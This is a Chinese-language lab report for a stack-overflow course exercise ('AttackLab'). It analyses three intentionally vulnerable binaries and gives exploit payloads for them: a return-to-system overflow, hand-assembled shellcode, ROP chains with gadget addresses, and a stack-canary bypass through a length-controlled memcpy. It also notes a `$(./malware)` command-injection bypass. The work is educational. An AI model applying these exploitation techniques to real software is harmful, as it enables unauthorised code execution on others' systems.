# AttackLab 技术笔记（2026-11-23 复核，VirtualBox Ubuntu 24.04）

本文档是实验报告的事实来源汇总：所有地址均来自本仓库 `attack/` 中的原始
二进制（哈希与 `.github/workflows/lab3-checks.yml` 一致），并通过 `objdump`、
`nm`、`readelf` 与 GDB 实际验证。可复现脚本位于 `tools/`，原始记录位于
`analysis/gdb/`、`analysis/logs/`、`analysis/disassembly/`。

## 1. 三个 ELF 与 malware 的静态事实

| 项目 | dark-calc | dark-calc-nx | dark-log |
|---|---|---|---|
| 类型 | ELF64 x86-64 ET_EXEC（非 PIE） | 同左 | 同左 |
| GNU_STACK | RW（未请求执行） | RW | RW |
| RELRO | Partial | Partial | Partial |
| canary 导入 | 无 | 无 | `__stack_chk_fail` |
| 特殊路径 | `init_fixed_stack` 构造器 + `__wrap_main` | 无 | 无 |

- 三个主映像都链接在 0x400000，`.text` 地址固定，与 ASLR 无关。
- `dark-calc` 的 `.init_array` 里有 `init_fixed_stack`：以
  `mmap(0x721000000000, 0x802000, PROT_READ|PROT_WRITE|PROT_EXEC,
  MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0)` 映射固定地址的 8 MiB
  匿名区，然后把两端各 0x1000 用 `mprotect(..., PROT_NONE)` 变成守卫页，
  把 `0x721000801000` 存入 `fixed_stack_top`。
- `__wrap_main`：`push r12; mov r12,rsp; mov rsp,[fixed_stack_top]; call main;
  mov rsp,r12; pop r12; ret`。因此 dark-calc 的 main 及其全部调用链运行在
  0x721000001000–0x721000801000 这段 rwxp 固定地址栈上，运行期映射（GDB
  `info proc mappings`）证实权限为 rwxp，两侧 ---p。
- `dark-calc-nx` 没有固定栈构造器，栈是内核分配的普通线程栈，映射为 rw-p
  （NX 生效），栈地址随机（ASLR=2）。

### dark-calc / dark-calc-nx 的输入路径

`input()`：`char expression[MAXLEN+1]`（16 字节，`rbp-0x10`），无界 `gets`，
然后 `strcpy(command_buf, expression)`（`command_buf` 是 0x6030d0/0x602090
处的全局 31 字节缓冲）。
`eval()`：`len = min(strlen(command_buf), 15)`，把
`command_buf` 右移到 `+8`，前缀 `"echo $(("`（8 字节），后缀 `"))"`，然后
`printf("Executing: %s\n")` + `system(command_buf)`。
`main()`：无限循环 `input(); eval();`。
`grade_eval(int grade)`：`grade==4` 时打印 `\n\033[31m Hope %c will be your
grade! \n`（`4-4+'A'='A'`），随后 `fflush(stdout)`。

- dark-calc：`grade_eval=0x401a87`，`system@plt=0x4017e0`，eval 的调用点
  `mov edi,0x6030d0; call system@plt` = **0x401a6b**，input 的空输入分支
  `mov edi,0; call exit@plt` = **0x4019b9**。
- dark-calc-nx：`input=0x401868`，`grade_eval=0x401978`，input 的空输入分支
  `mov edi,0; call exit@plt` = **0x4018aa**；`grade_eval` **没有 canary**，不能与
  dark-log 的保护机制混淆。
- 二者 `__libc_csu_init` 尾部都是 `pop rbx; pop rbp; pop r12; pop r13; pop
  r14; pop r15; ret`，机器码 `41 5f c3`，因此从第 2 个字节进入得到
  `pop rdi; ret`：dark-calc **0x401c93**，dark-calc-nx **0x401a33**。

### dark-log

`struct log_frame { char expression[128]; char logMsg[128]; int len;
char pad[8]; }`，编译器把它放在一个 0x120 的帧里：

| 偏移（相对 rbp） | 字段 |
|---|---|
| -0x120 | expression[0..127] |
| -0xa0 | logMsg[0..127] |
| -0x20 | len（int） |
| -0x1c | pad[8] |
| -0x08 | stack canary（fs:0x28 的副本） |
| +0x00 | saved rbp |
| +0x08 | saved return address |

`input()`：`f.len=0; puts(...); gets(f.expression)`（无界），然后
`memcpy(f.logMsg + f.len, f.expression, 128)`——**len 由输入控制，决定这
128 字节拷贝的目的地**；返回前 `[rbp-8] ^ fs:0x28` 校验，失败调用
`__stack_chk_fail`。`main()` 与 `grade_eval()` 也各自有独立 canary。
`grade_eval=0x401677`；csu 尾部的未对齐 `pop rdi; ret` = **0x4018a3**。

### attack/malware

POSIX shell 脚本：打印进程树，然后沿父进程链向上找 `comm == "dark-calc"`；
命中后先打印 `### The bomb was triggered by the dark-calc process. ###`，
再打印 `### You have successfully detonated the bomb! Congratulations! ###`。
所以它必须由 dark-calc 通过 `system()` 之类的方式直接/间接启动。

## 2. dark-calc 固定栈上的 input 帧（任务一）

GDB 实测（`analysis/gdb/01_frame_and_main.txt`，ASLR 打开）：

| 地址 | 内容 |
|---|---|
| 0x721000800fd0 | expression[16]（gets 写入起点） |
| 0x721000800fe0 | input 的 saved rbp = 0x721000800ff0（main 的 rbp） |
| 0x721000800fe8 | input 的返回地址 = 0x401ad1（main+0xe） |
| 0x721000800ff0 | main 的 saved rbp = 原内核栈帧指针（非 0，随 ASLR 变化；__wrap_main 未改 rbp） |
| 0x721000800ff8 | __wrap_main 调 main 压入的返回地址 0x401c1f |
| 0x721000801000 | 守卫页起点（PROT_NONE） |

- 缓冲区首地址是 **常量** `0x721000800fd0`（固定映射，无随机化）。
- 官网任务一 Q4/Q5 的补充逐步记录来自 `analysis/gdb/00_call_return.txt`：
  `call input` 在 main+9 将 0x401ad1 压栈；prologue 保存旧 rbp 并建立帧；
  `leave` 恢复 rsp/rbp，`ret` 将 0x401ad1 弹入 rip 并回到 main+14。
- 缓冲区到返回地址槽 = 24 字节；到守卫页 = 48 字节。gets 在输入末尾写
  一个 NUL，因此 dark-calc 上单次输入最多 47 字节，否则 gets 自身触发
  SIGSEGV（写入 PROT_NONE 页）。

## 3. 各任务利用方案

### 任务三 payload.py（32 数据字节，含换行 33 字节）→ system("./malware")

```
"./malware\0" + "A"*6          # expression[16]
p64(fixed_stack_top - 0x10)    # 保留 main 的固定 rbp 槽地址
p64(0x401a6b)                  # 返回地址 → eval 的 mov edi,0x6030d0; call system
```
`input()` 的 `strcpy` 把 expression 按 C 字符串拷进 `command_buf`，即
`"./malware"`；返回地址改为 0x401a6b 后，`mov edi,0x6030d0` 直接给参数寄存器赋值，
然后调用 `system`。它不是 `pop rdi`，不会弹栈。dash 执行 `sh -c ./malware`，
malware 的父链是 sh→dark-calc，命中判定。
伪造 saved rbp 在 eval 的 `leave` 前无需有效值，但 `leave` 会使用它。当前实现保留
`fixed_stack_top-0x10`（main 的 rbp 槽地址）：input 的 leave 恢复 main 帧，eval 的
leave 再恢复包装函数路径，使用 `fixed_stack_top-8` 未改写的返回地址回到
`__wrap_main`，而不是留下 0x4242… 后崩溃。实际退出状态以
`analysis/logs/ci_simulation.json` 和更新后的 `analysis/gdb/05_system_epilogue.txt`
为准；旧日志若仍含 0x4242…/SIGBUS，只代表旧输入，不得冒充当前结果。
三 qword 的 `pop rdi; ret` 链需要 24+24=48 字节，加 NUL 超窗，故用此 32 字节
方案。另注：`$(./malware)` 共 **12 字符**，dash 的事后复现表明命令替换确实发生，
但成功横幅在 **stderr**；stdout 只有提示、Executing 和内置答案，因此该旁路**不能通过
只搜索 stdout 的当前 CI**，本任务仍按要求用栈溢出。证据为
`analysis/logs/command_substitution.txt`（由 `tools/capture_command_substitution.py` 在隔离副本采集）。
`grade_eval(4)` 仅是任务五至七的目标函数，不是任务三的控制流终点。

### 任务五 payload_dark.py（32 字节）→ 固定栈 shellcode

```
b8 87 1a 40 00                 mov eax,0x401a87      ; grade_eval
6a 04 5f                       push 4; pop rdi        ; edi = 4
2d ce 00 00 00                 sub eax,0xce           ; eax = 0x4019b9（exit0 调用点）
50                             push rax               ; 把 exit0 作为 grade_eval 返回地址压栈
05 ce 00 00 00                 add eax,0xce           ; eax 恢复为 grade_eval
ff e0                          jmp rax
... NOP 填充到 24 字节
p64(0x721000800fd0)            input 返回地址 → 缓冲区（shellcode）
```
非 PIE 主映像代码地址均 < 2^32，mov eax + sub/add 的 32 位立即数形式比 movabs
短，21 字节就装下「设参 + 调函数 + 干净退出」。进 grade_eval 前先 push rax
（=exit0）：既是给它的返回地址，又把 rsp 下移一个 qword，使 grade_eval 入口
rsp%16=8（与正常 call 一致），其内部 printf 的 movaps 不会崩溃；grade_eval ret
时弹出 exit0 调用点（mov edi,0; call exit@plt），进程以状态 0 干净退出。

### 任务六 payload_rop.py（64 字节）→ dark-calc-nx 的 ROP

```
"R"*24                         padding 到返回地址槽
p64(0x401a33)                  pop rdi; ret
p64(4)                         参数 grade=4
p64(0x401a34)                  裸 ret（栈对齐垫片）
p64(0x401978)                  grade_eval
p64(0x4018aa)                  mov edi,0; call exit@plt（干净退出）
```
栈对齐：input 的 ret 之后 rsp%16=0；pop rdi 弹掉参数后 %16=8；紧随的裸 ret 把
控制流再弹一次并进入 grade_eval，此时 %16=8，与正常 call 一致，故其内部 printf
不会因 movaps 崩溃。全链只用非 PIE 主映像固定地址，不依赖栈地址与 libc 地址
（ASLR 无效）。

### 任务七 payload_canary.py（260 字节）→ dark-log 保 canary 改流

```
[0..7]    "K"*8                      fake saved rbp
[8..15]   p64(0x4018a3)              pop rdi; ret
[16..23]  p64(4)
[24..31]  p64(0x4018a4)              裸 ret（栈对齐垫片）
[32..39]  p64(0x401677)              grade_eval
[40..255] "L" 填充
[256..259] p32(0xa0)                 len = 160 → memcpy 目的 = rbp
```
- 输入只有 260 字节：gets 的 NUL 落在偏移 260（pad 区），canary（偏移 280）
  完全未触及。
- `memcpy(logMsg + 0xa0, expression, 128)` 的目的地 = rbp，恰好覆盖 saved
  rbp 与返回地址（rbp..rbp+0x7f），canary 保持 fs:0x28 原值，校验通过，
  `leave; ret` 进入 ROP 链。
- 对照实验（覆盖 canary 的 288 字节输入）触发
  `*** stack smashing detected ***: terminated` + SIGABRT（04b 记录）。
- grade_eval 打印并 flush 后返回到 "L" 填充处 → SIGSEGV；CI 只检查 stdout。

## 4. 长度行为矩阵（任务二）

实测（`analysis/logs/length_tests.md`，输入为 '1' 串）：
0 → 打印 `42_is_The_Ànswer` 退出 0；1–15 → eval 正常执行
`echo $((...))`；16–23 → 覆盖 saved rbp 但返回地址完好，eval 把输入截断到
15 字符照常执行；24–47 → 返回地址被覆盖，返回时崩溃（SIGBUS/SIGSEGV）；
≥48 → gets 的 NUL 写入守卫页，gets 内部 SIGSEGV。另注意 stdout 是全缓冲的，
`system()` 子进程的输出会先于 `Executing:` 行出现。

题面要求的 20/32 字符栈转储在 `analysis/gdb/06_length_overflow.txt`：20 字符输入
部分覆盖 saved rbp 而保留返回地址，32 字符输入同时覆盖 saved rbp 和返回地址。
`analysis/gdb/07_main_memory.txt` 用 `x` 检查 main 内存。前三条指令的左闭右开区间为：
`[0x401ac3,0x401ac4)` = `55`；`[0x401ac4,0x401ac7)` = `48 89 e5`；
`[0x401ac7,0x401acc)` = `b8 00 00 00 00`。它们连续按小端字节序存储，长度分别
为 1、3、5 字节。

## 5. 复现命令（VirtualBox Ubuntu 24.04）

```sh
# 校验仓库 attack/ 并创建新的隔离副本；不删除或复用 ~/lab3。
export ATTACKLAB_WORKDIR="$(bash tools/prepare_lab.sh)"
export ATTACKLAB_FIXTURE_DIR="$ATTACKLAB_WORKDIR/fixtures"
bash tools/capture_gdb.sh                        # 自动准备新副本、fixtures 和 GDB 日志
bash tools/capture_disassembly.sh                # analysis/disassembly/*.txt
python3 tools/run_evidence.py                    # analysis/logs/*（核心判分步骤记录）
python3 tools/capture_command_substitution.py    # stdout/stderr 分开的旁路观察
python3 payload.py > "$ATTACKLAB_FIXTURE_DIR/p5.bin"
(cd "$ATTACKLAB_WORKDIR" && ./dark-calc < "$ATTACKLAB_FIXTURE_DIR/p5.bin")
```
官方核心判分动作：生成 payload → 在 attack/ 重定向 stdin → 分别保存 stdout/stderr →
只匹配 stdout；官方 workflow 另有哈希检查与超时等步骤。本地复现不宣称等于整个 CI。
各 payload 的 `target_rc` 和 stdout 命中状态由 `ci_simulation.json` 动态读取。

## 6. 环境

VirtualBox Ubuntu 24.04.5 LTS，内核 7.0.0-43-generic；glibc 2.39（2.39-0ubuntu8.12）；
gcc 13.3.0；GNU gdb 15.1；binutils 2.42；Python 3.12.3；
`/proc/sys/kernel/randomize_va_space=2`。GDB 默认 `disable-randomization=on`，
本实验所有会话都显式 `set disable-randomization off`。CI 同为 ubuntu-24.04
（glibc 2.39）：四个 payload 只使用非 PIE 固定代码地址与 dark-calc 的固定
映射地址，不依赖栈/libc 地址；本环境记录与公开 CI 的核心 stdout 判定可相互参照，
但不是对任意 runner、未来提交或人工评分的保证。GitHub Actions run 45372795393
（2026-11-24，基线提交 d54873f）的两个 job 均已成功；新修改仍须以新 run 为准。

证据采集分两次：2026-11-23 在 7.0.0-31 / glibc 2.39-0ubuntu8.9 上首次采集，
2026-11-24 系统自动升级到 7.0.0-43 / 8.12 后重跑采集与终端截图。 2026-11-25 修复 payload.py（干净 exit(0)）后重拍五张终端截图并重建 DOCX/PDF（48 页）。
当前各 payload 的退出状态和 stdout 命中以 `ci_simulation.json` 为准，避免沿用旧记录。

报告里的五张图来自**虚拟机文本控制台截图**，不是示意图：

```sh
# 不传目录时：mktemp -d /tmp/attacklab-screens.XXXXXX，再 prepare 其 lab 子目录。
# 也可以显式复用已验证的 ATTACKLAB_WORKDIR / ATTACKLAB_FIXTURE_DIR。
bash tools/screens/setup.sh
bash tools/screens/s1.sh             # 各场景：在 guest 的 tty 上直接执行
# 宿主机侧抓屏（每个场景一次）：
VBoxManage controlvm ICS-AttackLab-Ubuntu2404 screenshotpng shot.png
```

s1/s2/s4/s5 在隔离副本中运行真实程序；s3 只生成并转储 payload，不运行靶机。
fixtures 由当前生成器即时产生，绝不使用固定 `/tmp/lab3-inputs`；工作副本与仓库
`attack/` 逐字节核对。所有场景启用失败传播，s5 特别保留目标程序的实际退出状态。
截图后只裁掉四周空白；命令行为 `bash tools/screens/sN.sh`，可在 Linux 虚拟机复现。
报告生成器只加载已有日志和标记，不自行宣称所有文字都由工具自动提取。
